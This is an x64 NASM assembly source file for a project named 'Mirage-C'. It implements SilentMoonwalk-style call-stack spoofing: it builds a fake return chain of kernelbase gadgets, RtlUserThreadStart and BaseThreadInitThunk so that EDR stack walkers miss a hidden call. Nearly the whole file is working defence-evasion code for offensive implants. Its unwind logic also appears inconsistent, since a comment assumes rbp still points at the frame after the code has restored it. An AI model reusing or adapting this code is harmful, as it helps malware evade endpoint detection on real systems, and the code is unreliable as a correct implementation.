; stack_spoof_stubs.asm - SilentMoonwalk-style stack spoofing for Mirage-C
; NASM x64, win64 ABI
;
; Builds synthetic call stack. EDR stack walker sees kernelbase gadgets ->
; RtlUserThreadStart -> BaseThreadInitThunk.
;
; spoof_call(cfg, target, a1..a11)
; We corrupt RBX (JMP[RBX] trick) - caller must not rely on it.
;
; Layout (include/stack_spoof_layout.inc — single source of truth,
;          enforced by tests/test_stack_spoof_offsets.c):
;
;   At entry:                       after push rbp; mov rbp,rsp:
;     [rsp+0x00] return address       [rbp+0x08] return address
;     [rsp+0x08..0x27] caller shad    [rbp+0x28..0x68] args 3..11
;
;   Own frame (after sub rsp, SSL_FRAME_SIZE):
;     [rsp+0x00..0x27] fake chain (5 qwords: jmp gadget, add_rsp gadget,
;                       RtlUserThreadStart, BaseThreadInitThunk, restore
;                       thunk)
;     [rsp+0x28..0x60] target stack args a5..a11 (callee-reachable window;
;                       a5 home at 0x28 overlaps the callee shadow, which
;                       win64 allows — the callee owns that slot)
;     [rbp-0x30..rbp-0x68] non-volatile saves (8 qwords, above rsp+0x60)
;     [rbp-0x70..rbp-0xe8] arg stashes (a5..a11 + a2, above rsp+0x60)
;
; Both the NV-save and stash regions sit strictly above (lower address
; than) rsp+0x60, so the tail-jumped target can never clobber them —
; this fixes the audit defect where saves at [rbp-0x8..-0x30] collided
; with the syscall-arg write window and stashes collided with the fake
; chain.
;
; Unwind: the old design relied on the ADD_RSP,imm8 gadget to pop the
; frame — an imm8 cannot unwind 0x50. Instead the last chain slot is
; `spoof_restore_thunk` (in this file): mov rsp,rbp; pop rbp; ret —
; it consumes the real return from [rbp+0x08] and restores rsp exactly
; to the caller's post-call state. The ADD_RSP gadget is kept in the
; chain for stack-walker fidelity only; its imm8 is recorded in
; cfg->rsp_adjust by spoof_init() for the C-side chain math.

bits 64
default rel

%include "stack_spoof_layout.inc"

section .text

global spoof_call
global spoof_restore_thunk

spoof_call:
    push rbp
    mov rbp, rsp

    ; ── Save non-volatiles into our frame (above the callee window) ──
    ; NV slots: [rbp-(NV_SAVE_BASE-0x00)] rdi .. [rbp-(NV_SAVE_BASE-0x28)] r15,
    ;           remaining two slots spare (layout reserves 8).
    mov [rbp - (SSL_NV_SAVE_BASE - 0x00)], rdi
    mov [rbp - (SSL_NV_SAVE_BASE - 0x08)], rsi
    mov [rbp - (SSL_NV_SAVE_BASE - 0x10)], r12
    mov [rbp - (SSL_NV_SAVE_BASE - 0x18)], r13
    mov [rbp - (SSL_NV_SAVE_BASE - 0x20)], r14
    mov [rbp - (SSL_NV_SAVE_BASE - 0x28)], r15

    ; ── Stash a1/a2/target BEFORE touching arg registers ──
    ; a1 arrives in r8, a2 in r9; both registers are repurposed below.
    mov r12, rdx                    ; target -> r12 (NV, already saved)
    mov r13, r8                     ; a1 -> r13
    mov [rbp - (SSL_STASH_BASE - 0x00)], r9   ; a2 stash (top stash slot)

    ; ── Read args 3..11 from the caller stack (correct win64 slots) ──
    mov r8,  [rbp + SSL_ARG3_OFF]   ; arg3 -> r8
    mov r9,  [rbp + SSL_ARG4_OFF]   ; arg4 -> r9
    mov rax, [rbp + SSL_ARG5_OFF]
    mov [rbp - (SSL_STASH_BASE - 0x08)], rax  ; stash a5
    mov rax, [rbp + SSL_ARG6_OFF]
    mov [rbp - (SSL_STASH_BASE - 0x10)], rax  ; stash a6
    mov rax, [rbp + SSL_ARG7_OFF]
    mov [rbp - (SSL_STASH_BASE - 0x18)], rax  ; stash a7
    mov rax, [rbp + SSL_ARG8_OFF]
    mov [rbp - (SSL_STASH_BASE - 0x20)], rax  ; stash a8
    mov rax, [rbp + SSL_ARG9_OFF]
    mov [rbp - (SSL_STASH_BASE - 0x28)], rax  ; stash a9
    mov rax, [rbp + SSL_ARG10_OFF]
    mov [rbp - (SSL_STASH_BASE - 0x30)], rax  ; stash a10
    mov rax, [rbp + SSL_ARG11_OFF]
    mov [rbp - (SSL_STASH_BASE - 0x38)], rax  ; stash a11

    ; ── Build fake return chain (5 slots = SSL_CHAIN_SIZE) ──
    sub rsp, SSL_FRAME_SIZE
    mov r10, [rcx]                  ; jmp_rbx_gadget
    mov r11, [rcx + 8]              ; add_rsp_gadget
    mov rax, [rcx + 16]             ; rtl_user_thread_start
    mov [rsp + 0x00], r10           ; JMP[RBX] gadget
    mov [rsp + 0x08], r11           ; ADD_RSP gadget
    mov [rsp + 0x10], rax           ; RtlUserThreadStart
    mov rax, [rcx + 24]             ; base_thread_init_thunk
    mov [rsp + 0x18], rax           ; BaseThreadInitThunk
    lea rax, [rel spoof_restore_thunk]
    mov [rsp + 0x20], rax           ; restore thunk (unwinds via rbp)

    lea rbx, [rsp + 0x08]           ; RBX -> fake[1] (add_rsp gadget)

    ; ── Setup target args (a1..a4 registers, a5..a11 stack window) ──
    mov rcx, r13                    ; a1
    mov rdx, [rbp - (SSL_STASH_BASE - 0x00)]  ; a2
    ; r8 = arg3, r9 = arg4 already in place
    mov rax, [rbp - (SSL_STASH_BASE - 0x08)]
    mov [rsp + 0x28], rax           ; a5 (callee shadow/home slot)
    mov rax, [rbp - (SSL_STASH_BASE - 0x10)]
    mov [rsp + 0x30], rax           ; a6
    mov rax, [rbp - (SSL_STASH_BASE - 0x18)]
    mov [rsp + 0x38], rax           ; a7
    mov rax, [rbp - (SSL_STASH_BASE - 0x20)]
    mov [rsp + 0x40], rax           ; a8
    mov rax, [rbp - (SSL_STASH_BASE - 0x28)]
    mov [rsp + 0x48], rax           ; a9
    mov rax, [rbp - (SSL_STASH_BASE - 0x30)]
    mov [rsp + 0x50], rax           ; a10
    mov rax, [rbp - (SSL_STASH_BASE - 0x38)]
    mov [rsp + 0x58], rax           ; a11

    ; r12 held the target — save it to the volatile rax BEFORE the NV
    ; restore below overwrites r12 with the caller's saved value.
    mov rax, r12

    ; ── Restore non-volatiles from the NV region ──
    mov rdi, [rbp - (SSL_NV_SAVE_BASE - 0x00)]
    mov rsi, [rbp - (SSL_NV_SAVE_BASE - 0x08)]
    mov r12, [rbp - (SSL_NV_SAVE_BASE - 0x10)]
    mov r13, [rbp - (SSL_NV_SAVE_BASE - 0x18)]
    mov r14, [rbp - (SSL_NV_SAVE_BASE - 0x20)]
    mov r15, [rbp - (SSL_NV_SAVE_BASE - 0x28)]
    mov rbp, [rbp]

    ; Tail-jump to the target (rax). rsp is left at fake chain[0], so the
    ; target's ret lands on fake[1] (add_rsp gadget) and the walker sees
    ; RtlUserThreadStart -> BaseThreadInitThunk -> spoof_restore_thunk.
    jmp rax

; ── Restore thunk — the last link of the fake chain ──
; The target eventually rets through the chain to us. rbp still points at
; spoof_call's frame: mov rsp,rbp rewinds past the whole sub'd frame (the
; add_rsp gadget already popped part of the chain — rsp is somewhere
; inside [rbp-0x50, rbp-0x08], rewinding via rbp is the only unwind that
; works for any imm8), then pop rbp / ret consumes the REAL return
; address stored at [old rbp+0x08], leaving rsp exactly where the caller
; expects it after a normal call to spoof_call.
spoof_restore_thunk:
    mov rsp, rbp
    pop rbp
    ret
